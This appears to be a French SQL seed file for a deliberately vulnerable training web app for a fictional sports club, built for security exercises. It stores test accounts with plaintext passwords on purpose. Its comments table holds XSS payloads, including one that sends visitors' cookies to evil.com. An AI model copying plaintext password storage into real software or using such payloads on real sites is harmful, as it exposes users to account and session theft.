-- ============================================================
-- DONNÉES DE TEST ET D'EXPLOITATION
-- AS Olympique Saint-Rémy
-- ============================================================

USE as_olympique_db;

-- ============================================================
-- NETTOYAGE DES DONNÉES EXISTANTES (OPTIONNEL)
-- ============================================================
-- Décommenter si vous voulez réinitialiser complètement

-- TRUNCATE TABLE access_logs;
-- TRUNCATE TABLE login_attempts;
-- TRUNCATE TABLE resultats;
-- TRUNCATE TABLE reservations;
-- TRUNCATE TABLE fichiers;
-- TRUNCATE TABLE commentaires;
-- TRUNCATE TABLE inscriptions;
-- DELETE FROM activites;
-- DELETE FROM membres;

-- ============================================================
-- MEMBRES DE TEST
-- ============================================================

-- Mots de passe en clair pour les tests (version vulnérable)
-- Pour la version sécurisée, utiliser password_hash()

INSERT INTO membres (login, password, nom, prenom, email, telephone, role, actif) VALUES
-- Administrateur
('admin', 'admin123', 'Administrateur', 'Super', 'admin@as-olympique.fr', '0123456789', 'admin', 1),

-- Membres réguliers
('jean', 'password123', 'Dupont', 'Jean', 'jean.dupont@email.com', '0612345678', 'membre', 1),
('marie', 'marie2024', 'Martin', 'Marie', 'marie.martin@email.com', '0623456789', 'secretaire', 1),
('pierre', 'motdepasse', 'Bernard', 'Pierre', 'pierre.bernard@email.com', '0634567890', 'membre', 1),
('sophie', 'secure123', 'Dubois', 'Sophie', 'sophie.dubois@email.com', '0645678901', 'tresorier', 1),
('luc', 'password', 'Petit', 'Luc', 'luc.petit@email.com', '0656789012', 'membre', 1),

-- Compte désactivé (pour tests)
('test_inactif', 'test123', 'Inactif', 'Compte', 'inactif@test.com', NULL, 'membre', 0);

-- ============================================================
-- ACTIVITÉS SPORTIVES
-- ============================================================

INSERT INTO activites (nom, description, jour_semaine, heure_debut, heure_fin, lieu, places_max, tarif, actif) VALUES
('Football', 'Entraînement de football tous niveaux. Matchs amicaux le samedi.', 'mercredi', '18:00', '20:00', 'Stade Municipal', 22, 150.00, 1),
('Tennis', 'Cours de tennis pour adultes débutants et intermédiaires.', 'samedi', '10:00', '12:00', 'Courts de tennis', 8, 200.00, 1),
('Natation', 'Cours de natation pour tous niveaux. Perfectionnement technique.', 'mardi', '19:00', '20:30', 'Piscine municipale', 15, 180.00, 1),
('Yoga', 'Séances de yoga et relaxation. Débutants bienvenus.', 'jeudi', '18:30', '19:30', 'Salle polyvalente', 20, 120.00, 1),
('Basketball', 'Entraînement de basket. Tournois régionaux.', 'vendredi', '19:00', '21:00', 'Gymnase', 12, 140.00, 1),
('Volley-Ball', 'Volley-ball loisir et compétition.', 'lundi', '20:00', '22:00', 'Gymnase', 12, 130.00, 1),
('Running', 'Course à pied en groupe. Préparation marathons.', 'dimanche', '09:00', '11:00', 'Parc Municipal', 30, 80.00, 1),
('Judo', 'Cours de judo enfants et adultes.', 'mercredi', '17:00', '18:30', 'Dojo', 20, 160.00, 1);

-- ============================================================
-- INSCRIPTIONS
-- ============================================================

INSERT INTO inscriptions (membre_id, activite_id, statut) VALUES
-- Jean inscrit à plusieurs activités
(2, 1, 'validee'),   -- Football
(2, 3, 'validee'),   -- Natation
(2, 7, 'en_attente'), -- Running

-- Marie inscrite au Yoga et Tennis
(3, 2, 'validee'),   -- Tennis
(3, 4, 'validee'),   -- Yoga

-- Pierre
(4, 1, 'en_attente'), -- Football (en attente)
(4, 5, 'validee'),   -- Basketball

-- Sophie
(5, 4, 'validee'),   -- Yoga
(5, 6, 'validee'),   -- Volley

-- Luc
(6, 8, 'validee'),   -- Judo
(6, 1, 'annulee');   -- Football (annulé)

-- ============================================================
-- COMMENTAIRES (pour tests XSS)
-- ============================================================

-- Commentaires normaux
INSERT INTO commentaires (auteur, contenu, membre_id, modere) VALUES
('Jean Dupont', 'Super association ! Les entraîneurs sont très professionnels.', 2, 1),
('Marie Martin', 'J\'ai adoré le cours de yoga cette semaine. Très relaxant !', 3, 1),
('Pierre Bernard', 'Le terrain de foot est en excellent état. Bravo pour l\'entretien.', 4, 1),
('Anonyme', 'Vivement la prochaine compétition de basket !', NULL, 1),

-- Commentaires avec potentiel XSS (pour démonstration)
('Test XSS', '<script>alert("XSS")</script>', NULL, 0),
('Bob', 'Test <b>gras</b> et <i>italique</i>', NULL, 0),
('Alice', '<img src=x onerror=alert("XSS")>', NULL, 0),
('Hacker', '"><script>document.location="http://evil.com?c="+document.cookie</script>', NULL, 0);

-- ============================================================
-- FICHIERS UPLOADÉS (exemples)
-- ============================================================

INSERT INTO fichiers (nom_original, nom_serveur, mime_type, taille, membre_id) VALUES
('photo_profil.jpg', 'a1b2c3d4e5f6g7h8.jpg', 'image/jpeg', 245678, 2),
('document.pdf', 'f7e6d5c4b3a2918.pdf', 'application/pdf', 1024567, 3),
('rapport.docx', '1a2b3c4d5e6f7g8h.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 512345, 4);

-- ============================================================
-- RÉSERVATIONS
-- ============================================================

INSERT INTO reservations (membre_id, date_reservation, heure_debut, heure_fin, equipement, statut) VALUES
(2, '2026-02-15', '14:00', '16:00', 'Court de tennis n°1', 'confirmee'),
(3, '2026-02-16', '10:00', '12:00', 'Salle de yoga', 'confirmee'),
(4, '2026-02-17', '18:00', '20:00', 'Terrain de foot', 'en_attente'),
(5, '2026-02-20', '19:00', '21:00', 'Gymnase', 'confirmee');

-- ============================================================
-- RÉSULTATS SPORTIFS
-- ============================================================

INSERT INTO resultats (activite_id, date_competition, lieu, description, classement, score) VALUES
(1, '2026-01-15', 'Stade Régional', 'Match amical contre AS Rivale', '1er', '3-1'),
(5, '2026-01-20', 'Gymnase Central', 'Tournoi départemental de basket', '2ème', '85-78'),
(2, '2026-01-25', 'Club de Tennis', 'Tournoi interne', '1er', 'Victoire 6-4, 6-3');

-- ============================================================
-- TENTATIVES DE CONNEXION (pour anti-bruteforce)
-- ============================================================

-- Tentatives récentes (succès et échecs)
INSERT INTO login_attempts (login, ip_address, success) VALUES
('admin', '192.168.1.100', 1),
('jean', '192.168.1.101', 1),
('hacker', '10.0.0.1', 0),
('hacker', '10.0.0.1', 0),
('hacker', '10.0.0.1', 0),
('test', '192.168.1.150', 0);

-- ============================================================
-- LOGS D'ACCÈS (pour audit)
-- ============================================================

INSERT INTO access_logs (membre_id, action, details, ip_address, user_agent) VALUES
(1, 'login', 'Connexion réussie', '192.168.1.100', 'Mozilla/5.0'),
(2, 'upload', 'Upload de photo_profil.jpg', '192.168.1.101', 'Mozilla/5.0'),
(3, 'inscription', 'Inscription à l\'activité Yoga', '192.168.1.102', 'Mozilla/5.0'),
(NULL, 'failed_login', 'Tentative de connexion échouée - login: hacker', '10.0.0.1', 'curl/7.68.0');

-- ============================================================
-- HASHER LES MOTS DE PASSE (pour version sécurisée)
-- ============================================================

-- Pour utiliser avec les versions sécurisées, exécuter ce code PHP :
/*
<?php
$passwords = [
    'admin123',
    'password123',
    'marie2024',
    'motdepasse',
    'secure123',
    'password',
    'test123'
];

foreach ($passwords as $password) {
    echo "Password: $password\n";
    echo "Hash: " . password_hash($password, PASSWORD_DEFAULT) . "\n\n";
}
?>
*/

-- Puis mettre à jour avec les hash générés :
-- UPDATE membres SET password = '$2y$10$...' WHERE login = 'admin';
-- UPDATE membres SET password = '$2y$10$...' WHERE login = 'jean';
-- etc.

-- ============================================================
-- VÉRIFICATION DES DONNÉES
-- ============================================================

-- Compter les enregistrements insérés
SELECT 'Membres' as table_name, COUNT(*) as count FROM membres
UNION ALL
SELECT 'Activités', COUNT(*) FROM activites
UNION ALL
SELECT 'Inscriptions', COUNT(*) FROM inscriptions
UNION ALL
SELECT 'Commentaires', COUNT(*) FROM commentaires
UNION ALL
SELECT 'Fichiers', COUNT(*) FROM fichiers
UNION ALL
SELECT 'Réservations', COUNT(*) FROM reservations
UNION ALL
SELECT 'Résultats', COUNT(*) FROM resultats
UNION ALL
SELECT 'Login Attempts', COUNT(*) FROM login_attempts
UNION ALL
SELECT 'Access Logs', COUNT(*) FROM access_logs;

-- ============================================================
-- NOTES PÉDAGOGIQUES
-- ============================================================

/*
Ce fichier de seeds contient :

1. Des comptes utilisateurs avec mots de passe en CLAIR (vulnérable)
   - Pour version sécurisée : hasher avec password_hash()

2. Des commentaires avec XSS intentionnels (modere=0)
   - Pour tester les protections XSS

3. Des données variées pour tester :
   - Injection SQL (différents types d'utilisateurs)
   - CSRF (opérations de modification)
   - Upload de fichiers (exemples)
   - Session management (tentatives de connexion)

UTILISATION :
- Version vulnérable : Utiliser tel quel
- Version sécurisée : Hasher les mots de passe avant utilisation

RÉINITIALISATION :
mysql -u root -p as_olympique_db < database/seeds.sql
*/
